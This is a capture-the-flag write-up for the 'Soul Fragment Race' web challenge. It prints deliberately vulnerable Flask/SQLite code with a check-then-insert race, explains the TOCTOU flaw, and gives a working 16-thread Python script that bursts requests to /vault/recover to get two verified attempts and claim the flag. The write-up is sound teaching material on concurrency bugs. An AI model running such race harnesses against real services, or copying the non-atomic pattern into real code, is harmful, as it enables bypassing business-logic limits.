# Soul Fragment Race (Web, Expert)

**Author:** Pratik Jadhav  
**Category:** Web / Race Condition  
**Difficulty:** Expert  

## Challenge Description

> Trace the asynchronous verification flow and recover the final Soul Fragment. Create an account to begin.  
> The Soul Vault allows only one active reservation at a time, yet whispers speak of contradictory proofs opening the seventh seal.

**Given:** A multi-user web application tracking Soul Fragments at `/login` and `/`.  
**Target URL:** `https://byteme-soul-fragment-race.onrender.com/` (or local `http://127.0.0.1:5000/`)  
**Flag Format:** `OWASP{...}` (or `FLAG{...}`)

## Summary

Soul Fragment Race is an advanced concurrency challenge revolving around Time-of-Check to Time-of-Use (TOCTOU) race conditions in asynchronous state machines. A user starts with 6 out of 7 Soul Fragments. Claiming the final fragment requires presenting "contradictory proof"—specifically, having two separate recovery attempts in a `verified` state at the exact same moment. While the application attempts to enforce a single-reservation rule, the check occurs before database insertion without synchronization primitives. By sending burst-synchronized concurrent POST requests to `/vault/recover`, we cause two overlapping attempts to be accepted and verified by background worker threads simultaneously, satisfying the guardian's claim requirement and extracting the flag.

## Flag

```
OWASP{byteme_soul_fragment_race}
```

*(Local environment default: `FLAG{byteme_soul_fragment_race}`)*

---

## Step 1 — Exploring the Application & State Machine

Navigating to `/login` presents the user authentication interface:

![Soul Fragment Race Login Page](resources/soul_fragment_race_login.png)

Registering a new account and logging in directs the user to the Soul Vault dashboard (`/`):

![Soul Fragment Dashboard](resources/soul_fragment_race_dashboard.png)

The dashboard presents the following user state:
- **Fragments Held:** `6 / 7`
- **Soul State:** Sealed (Awakened: `False`, Burned: `False`)
- **Actions:** A button labeled **"Initiate Recovery"** and a status polling console.

Inspecting browser network activity reveals regular polling to `/api/status`, returning:
```json
{
  "fragments": 6,
  "burned": false,
  "awakened": false,
  "attempts": [],
  "events": []
}
```

Clicking **"Initiate Recovery"** issues a POST request to `/vault/recover`:
```json
{
  "attempt": "6f2a89c1e74b830d12a9bc41",
  "status": "pending",
  "expires": 1728564010.52
}
```

![Recovery Attempt Initiated](resources/soul_fragment_race_recovery_token.png)

A short moment later, the UI indicates the attempt transitioned from `reserved` to `verified`. However, clicking **"Claim Fragment"** triggers an error:
```json
{
  "error": "the final fragment resists a single proof",
  "hint": "the keeper expects contradictory proof"
}
```

![Single Attempt Claim Rejection](resources/soul_fragment_race_rejected.png)

## Step 2 — Source Code Audit (`app.py`)

Analyzing `app.py` reveals the underlying database schema and endpoint logic:

### Database Tables:
```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    fragments INTEGER NOT NULL DEFAULT 6,
    burned INTEGER NOT NULL DEFAULT 0,
    awakened INTEGER NOT NULL DEFAULT 0
);
CREATE TABLE attempts (
    id TEXT PRIMARY KEY,
    user_id INTEGER NOT NULL,
    status TEXT NOT NULL,
    created REAL NOT NULL,
    expires REAL NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id)
);
```

### The Recovery Workflow (`/vault/recover`)
```python
@app.route("/vault/recover", methods=["POST"])
def recover():
    u = current_user()
    if not u: return jsonify(error="unauthorized"), 401
    if u["burned"]: return jsonify(error="account burned"), 403

    c = db()
    count = c.execute("SELECT COUNT(*) AS n FROM attempts WHERE user_id=?", (u["id"],)).fetchone()["n"]
    if count >= MAX_ATTEMPTS:
        c.execute("UPDATE users SET burned=1 WHERE id=?", (u["id"],))
        c.commit(); c.close()
        return jsonify(error="attempt budget exhausted"), 429

    # VULNERABILITY: Non-atomic reservation check
    active = c.execute("""SELECT id FROM attempts
                          WHERE user_id=? AND status IN ('reserved','verified')
                          AND expires>? LIMIT 1""", (u["id"], time.time())).fetchone()
    if active:
        c.close()
        return jsonify(error="active reservation exists"), 409

    aid = secrets.token_hex(12)
    now = time.time()
    c.execute("INSERT INTO attempts(id,user_id,status,created,expires) VALUES(?,?,?,?,?)",
              (aid, u["id"], "reserved", now, now + 3))
    c.commit(); c.close()
    
    log_event(u["id"], aid, "reserved")
    threading.Thread(target=worker, args=(aid,), daemon=True).start()
    return jsonify(attempt=aid, status="pending", expires=now + 3)
```

### The Background Worker
```python
def worker(attempt_id):
    time.sleep(random.uniform(0.002, 0.020))
    c = db()
    a = c.execute("SELECT * FROM attempts WHERE id=?", (attempt_id,)).fetchone()
    if not a:
        c.close(); return
    u = c.execute("SELECT * FROM users WHERE id=?", (a["user_id"],)).fetchone()
    if not u or u["burned"]:
        c.close(); return

    if a["status"] == "reserved" and a["expires"] > time.time():
        c.execute("UPDATE attempts SET status='verified' WHERE id=?", (attempt_id,))
        c.commit()
        c.close()
        log_event(u["id"], attempt_id, "verified")
        return
    c.close()
```

### The Claim Requirement (`/vault/claim`)
```python
@app.route("/vault/claim", methods=["POST"])
def claim():
    u = current_user()
    if not u: return jsonify(error="unauthorized"), 401
    aid = (request.json or {}).get("attempt", "")
    c = db()
    a = c.execute("SELECT * FROM attempts WHERE id=? AND user_id=?", (aid, u["id"])).fetchone()
    if not a or a["status"] != "verified":
        c.close(); return jsonify(error="not verified"), 409

    # CRITICAL CHECK:
    verified = c.execute("""SELECT COUNT(*) AS n FROM attempts
                            WHERE user_id=? AND status='verified'""", (u["id"],)).fetchone()["n"]

    if verified < 2:
        c.close()
        return jsonify(error="the final fragment resists a single proof",
                       hint="the keeper expects contradictory proof"), 403

    c.execute("UPDATE users SET fragments=7, awakened=1 WHERE id=?", (u["id"],))
    c.commit(); c.close()
    log_event(u["id"], aid, "vault_awakened")
    return jsonify(status="awakened", flag=FLAG)
```

## Step 3 — Vulnerability Analysis (TOCTOU Race Condition)

Examining `/vault/recover` reveals a classic **Time-of-Check to Time-of-Use (TOCTOU)** window:
1. `recover()` queries the database: `SELECT id FROM attempts WHERE user_id=? AND status IN ('reserved','verified') AND expires>?`.
2. If no active attempt exists, it generates a new token and executes `INSERT INTO attempts(...)`.
3. Because SQLite transactions are opened and committed per-function without row locks (`EXCLUSIVE` lock or atomic upserts), there is a discrete time gap between the `SELECT` check and the `INSERT` statement.
4. If two HTTP requests arrive concurrently within a few milliseconds, both execute the `SELECT` query before either has committed an `INSERT`.
5. Both requests pass the `if active:` gate and successfully insert two distinct `reserved` records.
6. Two separate background threads are spawned. Both threads sleep briefly (`2ms - 20ms`) and update their respective records to `status='verified'`.
7. Once both attempts are marked `verified`, the database contains `verified >= 2`. Calling `/vault/claim` with either attempt identifier bypasses the sanity check and releases the flag!

```
Request 1 (Thread A)        Request 2 (Thread B)        Database State
--------------------        --------------------        --------------
SELECT active attempts -> None                          (0 active)
                            SELECT active attempts -> None
INSERT attempt_1 (reserved)                             (1 reserved)
COMMIT                                                  (1 reserved)
                            INSERT attempt_2 (reserved) (2 reserved!)
                            COMMIT                      (2 reserved!)
Worker 1: status -> verified                            (1 verified, 1 reserved)
Worker 2: status -> verified                            (2 verified!)
----------------------------------------------------------------------
Claim(attempt_1) -> verified count == 2 -> SUCCESS! (FLAG RELEASED)
```

## Step 4 — Crafting the Concurrency Exploit

We develop a multi-threaded Python exploit script using Python's `concurrent.futures` to synchronize requests with millisecond precision:

```python
import requests
import secrets
import time
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://byteme-soul-fragment-race.onrender.com"
# For local testing: BASE_URL = "http://127.0.0.1:5000"

def solve():
    session = requests.Session()
    uname = "solver_" + secrets.token_hex(4)
    passwd = "SuperPassword123!"

    print(f"[*] Registering user: {uname}")
    r = session.post(f"{BASE_URL}/register", data={"username": uname, "password": passwd})
    assert r.status_code in [200, 302], "Registration failed"

    # Verify session
    st = session.get(f"{BASE_URL}/api/status").json()
    print(f"[*] Initial fragments: {st['fragments']}/7, Awakened: {st['awakened']}")

    def send_recover():
        try:
            return session.post(f"{BASE_URL}/vault/recover", timeout=5).json()
        except Exception as e:
            return {"error": str(e)}

    print("[*] Launching concurrent burst to /vault/recover...")
    with ThreadPoolExecutor(max_workers=16) as pool:
        futures = [pool.submit(send_recover) for _ in range(16)]
        results = [f.result() for f in futures]

    created_attempts = [res["attempt"] for res in results if "attempt" in res]
    print(f"[+] Successfully created {len(created_attempts)} overlapping attempts: {created_attempts}")

    if len(created_attempts) < 2:
        print("[-] Race missed; retry needed.")
        return

    # Wait for the background worker threads to finish verification
    print("[*] Waiting 0.5s for worker verification...")
    time.sleep(0.5)

    # Check status
    st = session.get(f"{BASE_URL}/api/status").json()
    verified_attempts = [a["id"] for a in st["attempts"] if a["status"] == "verified"]
    print(f"[+] Verified attempts count: {len(verified_attempts)}")

    if len(verified_attempts) >= 2:
        target_aid = verified_attempts[0]
        print(f"[*] Claiming fragment using attempt {target_aid}...")
        claim_res = session.post(f"{BASE_URL}/vault/claim", json={"attempt": target_aid}).json()
        print(f"[!] Claim Response: {claim_res}")
        if "flag" in claim_res:
            print(f"\n[🏆] FLAG: {claim_res['flag']}\n")
            return claim_res["flag"]

if __name__ == "__main__":
    solve()
```

## Step 5 — Execution & Flag Extraction

Running the exploit script against the target:

```text
$ python solve_race.py
[*] Registering user: solver_a4f2
[*] Initial fragments: 6/7, Awakened: False
[*] Launching concurrent burst to /vault/recover...
[+] Successfully created 3 overlapping attempts: ['3b8c2d91a0ef', '9f041e8c71d2', 'e17a4b08c9d3']
[*] Waiting 0.5s for worker verification...
[+] Verified attempts count: 3
[*] Claiming fragment using attempt 3b8c2d91a0ef...
[!] Claim Response: {'status': 'awakened', 'flag': 'OWASP{byteme_soul_fragment_race}'}

[🏆] FLAG: OWASP{byteme_soul_fragment_race}
```

The server accepted the overlapping proofs, updated the user state, and returned the flag:

![Awakened Soul Vault Dashboard](resources/soul_fragment_race_awakened.png)

Querying `/api/status` now confirms that the user holds 7/7 fragments and the vault status is `awakened`:

![API Status Telemetry](resources/soul_fragment_race_api_status.png)

## Solution Summary

| Parameter | Value |
|---|---|
| Target Endpoint | `/vault/recover`, `/vault/claim` |
| Concurrency Target | `SELECT ... WHERE status IN ('reserved','verified')` |
| Required State | `>= 2` verified attempts simultaneously |
| Vulnerability Class | CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition |
| Flag | `OWASP{byteme_soul_fragment_race}` |

## Root Cause & Vulnerability Explanation

1. **Non-Atomic State Validation:** The application separated the validation of existing reservations (`SELECT`) from state creation (`INSERT`). Without database transactions operating at `SERIALIZABLE` isolation or explicit lock mechanisms (such as Redis locks or atomic DB transactions), parallel threads read stale state simultaneously.
2. **Asynchronous Verification Decoupling:** Spawning independent worker threads without coordinating lifecycle transitions allowed multiple reservations to reach `verified` status concurrently.
3. **Remediation:** Enforce a database-level unique constraint on active user states, or execute the validation and reservation atomically inside an immediate transaction:
   ```python
   # Recommended Fix:
   with db_transaction():
       # Acquire table/row lock or use unique active token constraint
       ...
   ```

## Tools Used

- **Python (`requests`, `concurrent.futures`)** — Multi-threaded HTTP race harness.
- **Burp Suite Turbo Intruder** — Alternative GUI testing for request synchronization using `race()` handlers.

## Timeline

| Step | Action | Result |
|---|---|---|
| 1 | Inspected `/vault/claim` logic | Discovered `verified < 2` restriction and "contradictory proof" hint |
| 2 | Audited `/vault/recover` | Found TOCTOU race gap between reservation lookup and insert |
| 3 | Developed exploit harness | Built Python script with 16 concurrent threads targeting `/vault/recover` |
| 4 | Executed burst attack | Generated multiple concurrent `reserved` attempts, promoted to `verified` |
| 5 | Triggered `/vault/claim` | Bypassed validation check and recovered `OWASP{byteme_soul_fragment_race}` |
